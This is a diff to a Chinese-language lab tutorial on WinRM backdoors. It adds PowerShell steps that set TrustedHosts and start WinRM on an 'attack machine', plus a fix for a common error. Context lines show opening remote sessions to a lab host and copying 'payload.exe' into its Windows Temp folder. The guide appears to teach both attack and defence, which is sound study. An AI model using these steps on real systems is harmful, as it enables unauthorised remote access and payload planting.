@@ -775,7 +775,14 @@ ipconfig
 **从另一台Windows攻击机连接（使用PowerShell）**：
 
 ```powershell
-# ===== 在攻击机（Windows）上连接 =====
+# ===== 在攻击机（Windows）上执行 =====
+
+# 【关键】客户端也需要配置TrustedHosts，否则会报错
+# 错误信息："WinRM 客户端无法处理该请求...必须将目标计算机添加到 TrustedHosts"
+Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.100.20" -Force
+
+# 如果WinRM服务未启动，需要先启动（客户端也需要运行WinRM服务）
+Start-Service WinRM
 
 # 交互式远程Shell
 Enter-PSSession -ComputerName 192.168.100.20 -Credential (Get-Credential)
@@ -791,6 +798,8 @@ Invoke-Command -ComputerName 192.168.100.20 -ScriptBlock {
 $session = New-PSSession -ComputerName 192.168.100.20 -Credential (Get-Credential)
 Copy-Item -Path "C:\local\payload.exe" -Destination "C:\Windows\Temp\" -ToSession $session
 ```
+
+> ⚠️ **常见报错**：如果出现"WinRM 客户端无法处理该请求...必须将目标计算机添加到 TrustedHosts"，说明**客户端**未配置TrustedHosts。WinRM要求双向信任——靶机和攻击机都需要将对方加入TrustedHosts（非域环境下）。
 
 **防御WinRM后门**：
 
